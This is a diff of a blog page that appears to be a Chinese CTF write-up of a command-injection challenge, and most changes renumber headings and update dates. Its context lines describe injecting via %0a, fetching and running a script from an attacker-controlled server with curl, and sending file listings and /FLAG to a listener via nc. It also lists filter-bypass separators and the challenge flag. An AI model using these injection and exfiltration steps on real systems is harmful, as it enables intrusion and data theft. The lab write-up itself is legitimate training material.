@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://jason1314zhang.github.io/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-8.png">
 <meta property="og:image" content="https://jason1314zhang.github.io/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-9.png">
 <meta property="article:published_time" content="2020-12-26T12:46:20.000Z">
-<meta property="article:modified_time" content="2020-12-27T12:56:34.550Z">
+<meta property="article:modified_time" content="2021-01-05T13:00:58.958Z">
 <meta property="article:author" content="SuperJason">
 <meta property="article:tag" content="命令执行">
 <meta property="article:tag" content="shell">
@@ -255,7 +255,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-12-27 20:56:34" itemprop="dateModified" datetime="2020-12-27T20:56:34+08:00">2020-12-27</time>
+                <time title="修改时间：2021-01-05 21:00:58" itemprop="dateModified" datetime="2021-01-05T21:00:58+08:00">2021-01-05</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -288,21 +288,21 @@
         <h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>详细的写了N1BOOK中命令执行题目的题解，nc、curl、server基本用法<br><br><span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI1slRTclQUMlQUMlRTQlQkElOEMlRTclQUIlQTAlMjB3ZWIlRTglQkYlOUIlRTklOTglQjZdJUU2JUFEJUJCJUU0JUJBJUExcGluZyVFNSU5MSVCRCVFNCVCQiVBNA==" title="https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%8C%E7%AB%A0%20web%E8%BF%9B%E9%98%B6]%E6%AD%BB%E4%BA%A1ping%E5%91%BD%E4%BB%A4">题目地址<i class="fa fa-external-link"></i></span></p>
 <a id="more"></a>
 
-<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>n1book{6fa82809179d7f19c67259aa285a7729}</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<h2 id="0x01-flag"><a href="#0x01-flag" class="headerlink" title="0x01 flag"></a>0x01 flag</h2><p>n1book{6fa82809179d7f19c67259aa285a7729}</p>
+<h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><ol>
 <li>访问环境，测试命令<code>127.0.0.1</code><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-1.png" alt></li>
 <li>接着测试<code>127.0.0.1 &amp;&amp; ls</code>，这里浪费了一点时间，以为<code>&amp;&amp;</code>不能让<code>ls</code>命令执行，其实是因为浏览器将我们输入的<code>&amp;&amp;</code>转码了，导致我们的输入其实变成了<code>127.0.0.1+%26%26+ls</code><br><strong>建议以后做注入题目时，直接用burpsuite，防止注入的数据被浏览器转码</strong><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-2.png" alt><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-3.png" alt></li>
 <li>这里还有一个问题，虽然ip ping成功，但后面的命令不一定执行了。接着用<code>sleep 5</code>进行延时注入，发现<code>&amp;&amp;</code>命令并不能让后面的sleep命令执行，接着测试<code>%0a</code>连接符，可以让后面的sleep命令执行</li>
 <li>开始猜测flag的位置，<code>flag</code>、<code>flag.php</code>、<code>flag.txt</code>等，没有找到明显的flag文件。由于没有命令执行的回显，如何找到flag文件并且将文件数据传出来是个问题，考虑<code>{flag file} | nc {your_server_ip port}</code>将数据传出来，但<code>|</code>和<code>:</code>符号被判定为恶意字符。  </li>
 </ol>
 <p><strong>如果没有服务器，可以用buuctf开小号，在basic/Linux labs上启动一个内网服务器</strong><br>5. <code>&gt;</code>没有被过滤，可以从服务器下载恶意脚本到本地并执行。这里使用<code>curl {your_server_ip}/ctf.sh</code>，然后准备给sh文件加执行权限，却无法添加，最后怀疑当前用户在当前目录没有保存文件的权限。<br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-4.png" alt><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-5.png" alt><br>6. 于是将<code>ctf.sh</code>保存到<code>tmp</code>目录下。添加可执行权限。<br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-6.png" alt><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-7.png" alt><br>7. 这里其实传了两次.sh文件，第一次的文件内容为<code>ls  | nc {your_server_ip port}</code>，得到当前目录下的文件列表，发现存在<code>/FLAG</code>文件，第二次的文件内容为<code>cat /FLAG | nc {your_server_ip port}</code>，将<code>/FLAG</code>文件内容传出来。<br>8. 在服务器上监听本地端口<code>nc -lvp 8888</code>，这里我的是8888。然后执行<code>ctf.sh</code>，得到回传的数据。<br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-8.png" alt><br><img src="/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/cmd-9.png" alt></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>命令执行主要是通过特殊字符让本不该执行的命令执行。常用的特殊字符有</p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>命令执行主要是通过特殊字符让本不该执行的命令执行。常用的特殊字符有</p>
 <ul>
 <li>转义符<br><code>^</code>、<code>\</code>、<code>&amp;</code></li>
 <li>连接符<br><code>&amp;&amp;</code>、<code>||</code>、<code>%0a</code>、<code>%0d</code>、<code>;</code>、<code>$()</code></li>
 <li>注释符号<br><code>#</code>、<code>::</code> </li>
 </ul>
-<h3 id="进一步的扩宽一下难度"><a href="#进一步的扩宽一下难度" class="headerlink" title="进一步的扩宽一下难度"></a>进一步的扩宽一下难度</h3><ol>
+<h2 id="0x04-进一步的扩宽一下难度"><a href="#0x04-进一步的扩宽一下难度" class="headerlink" title="0x04 进一步的扩宽一下难度"></a>0x04 进一步的扩宽一下难度</h2><ol>
 <li>cmd可以会过滤空格，可以用其他字符绕过</li>
 </ol>
 <ul>
@@ -409,7 +409,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-背景"><span class="nav-number">1.</span> <span class="nav-text">0x00 背景</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#flag"><span class="nav-number">1.1.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">1.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进一步的扩宽一下难度"><span class="nav-number">1.3.1.</span> <span class="nav-text">进一步的扩宽一下难度</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-背景"><span class="nav-number">1.</span> <span class="nav-text">0x00 背景</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-flag"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-思路"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-总结"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-进一步的扩宽一下难度"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 进一步的扩宽一下难度</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -425,7 +425,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -438,7 +438,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -475,7 +475,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
